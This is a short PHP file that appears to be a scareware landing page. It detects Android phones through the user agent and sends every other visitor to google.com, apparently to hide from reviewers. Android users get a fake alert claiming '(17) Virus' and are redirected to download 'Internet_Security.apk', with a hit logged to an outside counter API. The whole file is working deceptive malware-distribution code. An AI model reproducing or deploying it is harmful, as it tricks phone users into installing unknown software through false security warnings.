<?php

define('GOOD_URL', 'Internet_Security.apk');
define('BAD_URL', 'http://google.com/');
define('API_URL', 'http://site.com//api.php');


if(isset($_GET['go'])){
    @file_get_contents(API_URL.'?method=counter');
    header('Location:'.GOOD_URL);
}


use phpbrowscap\Browscap;

include('browscap/browscap.php');

$browscap = new Browscap('browscap/');
$browser = $browscap->getBrowser(@$_SERVER['HTTP_USER_AGENT']);

if($browser->isMobileDevice && in_array($browser->Platform, array('Android'))){
    $android = TRUE;
}else{
    header('Location:'.BAD_URL);
}

?>
<script>
alert("WARNING:Your phone has (17) Virus!\n\nYour personal data are in danger.\n\nPlease click OK to download free antivirus.");
window.location.href='?go=1';
</script>